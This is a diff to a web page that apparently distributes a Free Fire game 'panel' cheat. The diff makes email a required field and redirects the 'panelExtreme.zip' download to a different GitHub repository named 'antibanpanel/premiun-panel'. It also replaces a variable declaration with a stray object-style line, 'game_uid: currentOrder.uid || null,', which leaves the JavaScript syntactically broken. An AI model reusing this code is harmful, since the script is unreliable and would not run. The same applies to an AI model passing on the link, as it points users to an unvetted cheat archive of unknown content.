@@ -1014,15 +1014,17 @@
 
             <div class="field">
 
-              <label for="uid">
-                Game UID / Required ID
-              </label>
+  <label for="uid">
+    Email *
+  </label>
 
-              <input
-                id="uid"
-                placeholder="Enter only if required">
+  <input
+    type="email"
+    id="uid"
+    required
+    placeholder="Enter your email">
 
-            </div>
+</div>
 
 
             <div class="field full">
@@ -1729,11 +1731,9 @@
             .value
             .trim();
 
-        const uid =
-          document
-            .getElementById('uid')
-            .value
-            .trim();
+        game_uid:
+  currentOrder.uid ||
+  null,
 
         const note =
           document
@@ -2064,7 +2064,7 @@
 
 
       downloadBtn.href =
-        'https://github.com/abadyoamao009/free-fire-panel/raw/refs/heads/main/panelExtreme.zip';
+  'https://github.com/antibanpanel/premiun-panel/raw/refs/heads/main/panelExtreme.zip';
 
 
       downloadBtn.download =
